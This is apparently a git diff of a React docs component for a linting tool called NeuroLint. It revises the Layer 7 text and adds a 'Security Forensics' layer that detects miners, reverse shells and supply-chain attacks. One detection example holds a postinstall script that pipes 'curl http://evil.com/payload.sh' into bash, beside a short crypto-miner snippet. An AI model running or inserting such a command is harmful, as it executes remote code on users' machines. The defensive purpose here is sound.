@@ -1,5 +1,21 @@
+/**
+ * Copyright (c) 2025 NeuroLint
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ * 
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ * 
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+
 import React, { useState } from 'react';
-import { Settings, Layers, Sparkles, Target, ChevronDown, ChevronUp, Wrench, Code, Shield, Zap, Rocket, TestTube, Brain } from 'lucide-react';
+import { Settings, Layers, Sparkles, Target, ChevronDown, ChevronUp, Wrench, Code, Shield, Zap, Rocket, TestTube, Brain, ShieldAlert } from 'lucide-react';
 import { InstallCTA } from './InstallCTA';
 
 interface LayerDetail {
@@ -442,21 +458,22 @@ test('test should work correctly', () => {
     name: "Layer 7: Adaptive Learning",
     shortName: "L7 Adaptive",
     icon: <Brain className="w-6 h-6" />,
-    description: "Learns project-specific patterns from previous layers and applies custom rules automatically. Adapts to your codebase style.",
+    description: "Production-grade pattern learning with smart extraction, confidence scoring, and comprehensive test coverage.",
     whatItDoes: [
       "Analyzes transformations from Layers 1-6",
-      "Extracts common patterns and creates rules",
-      "Applies learned rules with confidence scoring",
+      "Smart pattern extraction - only learns from files with actual React hooks",
+      "Applies learned rules with 70%+ confidence scoring",
       "Stores rules in .neurolint/learned-rules.json",
-      "Provides adaptive suggestions for inline styles",
-      "Learns console removal patterns",
+      "Separates suggestions from actual changes (accurate metrics)",
+      "Debug logging via NEUROLINT_DEBUG environment variable",
       "Adapts to project-specific conventions"
     ],
     keyFeatures: [
-      "Machine learning-like pattern extraction",
+      "Production-grade pattern extraction (no overly broad patterns)",
       "Confidence-based rule application (minimum 70%)",
-      "Rule persistence and sharing across runs",
-      "Project-specific code style learning"
+      "Dry-run mode returns transformed code for preview",
+      "41 comprehensive unit tests for reliability",
+      "Verbose error logging for debugging"
     ],
     examples: [
       {
@@ -494,7 +511,63 @@ const Button = () => (
       }
     ],
     whenToUse: "Run last after all other layers. Most effective after running multiple fixes to learn project-specific patterns.",
-    technicalDetails: "Implements RuleStore class for pattern persistence. Uses confidence scoring (0-1.0) and frequency tracking. Extracts patterns by comparing before/after code from previous layers. Applies rules with minimum 0.7 confidence threshold."
+    technicalDetails: "Production-grade implementation with RuleStore class for pattern persistence. Smart pattern extraction only creates rules for files with actual React hooks (hasReactHooks, hasClientImports checks). Separates suggestions from changes for accurate metrics. Verbose error logging via NEUROLINT_DEBUG. Dry-run mode returns transformed code. Backed by 41 comprehensive unit tests."
+  },
+  {
+    id: 8,
+    name: "Layer 8: Security Forensics",
+    shortName: "L8 Security",
+    icon: <ShieldAlert className="w-6 h-6" />,
+    description: "Post-exploitation detection and security forensics for compromised codebases. Uses both regex-based signature matching AND AST-based behavioral analysis to detect React 19 hook exploits.",
+    whatItDoes: [
+      "Detects 80 IoC signatures across 11 categories (RSC-specific, Next.js, backdoors, crypto mining, etc.)",
+      "Scans for crypto miners, reverse shells, and data exfiltration",
+      "Identifies malicious package.json scripts (postinstall attacks)",
+      "Finds hardcoded credentials and API keys",
+      "Detects supply chain attack patterns",
+      "Creates integrity baselines for drift detection",
+      "Generates SARIF 2.1.0 reports for GitHub Security integration",
+      "Provides incident response timeline reconstruction"
+    ],
+    keyFeatures: [
+      "80 regex-based IoC signatures + 27 AST-based behavioral patterns",
+      "5 React 19 hook patterns: use(), useActionState, useOptimistic, startTransition, cache",
+      "Simple taint tracking for React 19 patterns (searchParams, formData, cookies)",
+      "SARIF 2.1.0 compliant for GitHub Security tab integration",
+      "CI/CD integration with --fail-on threshold",
+      "Multiple reporters: CLI, JSON, SARIF, HTML"
+    ],
+    examples: [
+      {
+        title: "Detecting Crypto Mining Code",
+        before: `// Hidden in minified bundle
+const miner = new CryptoNight.Miner('site-key');
+miner.start(CryptoNight.FORCE);`,
+        after: `// NeuroLint Security Alert:
+// CRITICAL: Crypto miner detected (CryptoNight)
+// File: dist/bundle.min.js:4523
+// Severity: CRITICAL
+// Action: Investigate immediately - code may be compromised`,
+        explanation: "Layer 8 detects crypto mining code patterns, even when hidden in minified bundles. Reports findings without modifying the suspicious code."
+      },
+      {
+        title: "Malicious Package Script Detection",
+        before: `{
+  "name": "trusted-package",
+  "scripts": {
+    "postinstall": "curl http://evil.com/payload.sh | bash"
+  }
+}`,
+        after: `// NeuroLint Security Alert:
+// CRITICAL: Malicious postinstall script detected
+// Pattern: Shell command execution via curl pipe
+// Risk: Supply chain attack - arbitrary code execution
+// Action: Remove package, audit dependencies`,
+        explanation: "Detects supply chain attack patterns in package.json scripts that execute remote payloads during npm install."
+      }
+    ],
+    whenToUse: "Run when you suspect compromise, after a security incident, or as part of regular security audits. Essential for CI/CD security gates.",
+    technicalDetails: "Dual-detection system: SignatureAnalyzer uses 80 regex-based IoC signatures across 11 categories. BehavioralAnalyzer uses Babel AST with 27 patterns including 5 React 19-specific hook patterns (use, useActionState, useOptimistic, startTransition, cache). Traces user input sources (searchParams, formData, cookies) to detect when user-controlled data flows into dangerous APIs. Outputs SARIF 2.1.0 format for GitHub Advanced Security integration."
   }
 ];
 
@@ -524,7 +597,7 @@ export function LayersDocSection() {
             Explore Each Layer in Detail
           </h2>
           <p className="text-xl md:text-2xl text-gray-300 max-w-4xl mx-auto font-medium mb-6">
-            Deep dive into NeuroLint's 7-layer architecture. Each layer targets specific issues with surgical precision.
+            Deep dive into NeuroLint's 8-layer architecture. Each layer targets specific issues with surgical precision.
           </p>
           <p className="text-lg text-gray-300 max-w-3xl mx-auto leading-relaxed">
             Each layer builds upon the previous, ensuring foundational issues are resolved first. Run individually or together based on your needs.
